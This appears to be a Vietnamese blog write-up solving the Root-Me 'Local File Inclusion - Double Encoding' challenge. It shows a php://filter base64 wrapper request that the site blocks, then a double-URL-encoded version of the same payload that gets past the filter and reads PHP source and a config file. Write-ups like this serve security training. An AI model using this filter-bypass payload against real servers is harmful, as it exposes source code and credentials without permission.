<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-fi/fi_chall2" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Local File Inclusion - Double Encoding
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Include can be dangerous.</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Find the validation password in the source files of the website.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h2 id="Double-Encoding"><a href="#Double-Encoding" class="headerlink" title="Double Encoding"></a>Double Encoding</h2>
                <p>Nghiên cứu tại: <a href="https://www.owasp.org/index.php/Double_Encoding" target="_blank" rel="noopener">https://www.owasp.org/index.php/Double_Encoding</a></p>
                <p>Lỗ hổng này xảy ra do việc máy chủ server chấp nhận và xử lý client requests trong nhiều kiểu encode.</p>
                <p>Nó dùng để byass một số filter khi chỉ decode user input 1 lần.</p>
                <h2 id="Tan-cong"><a href="#Tan-cong" class="headerlink" title="Tấn công"></a>Tấn công</h2>
                <p>Thử với website ta thấy mẫu của URL:</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch45/index.php?page=home" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch45/index.php?page=home</a></p>
                </blockquote>
                <p>Ta đoán là nó có thêm đuôi .php phía sau rồi.<br>Tức là khi ta nhập home =&gt; home.php</p>
                <p>Ta thử dùng wrapper để encode sang base64 đọc code xem sao?</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home</a></p>
                </blockquote>
                <p>Attack detected.<br>Có lẽ nó đã filter một số kí tự như dấu :// hay / hay = rồi.</p>
                <p>Đã có gợi ý là double encoding nên cũng không cần suy nghĩ nhiều. Encode chúng 2 lần và đọc file home.php nào.</p>
                <blockquote>
                    <p>php%253A%252F%252Ffilter%252Fconvert%252ebase64%252dencode%252Fresource%253Dhome</p>
                </blockquote>
                <p>Ta đọc được code từ base64.</p>
                <blockquote>
                    <p>&lt;?php include(“conf.inc.php”); ?&gt;</p>
                </blockquote>
                <p>Đọc file conf là có flag nha.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>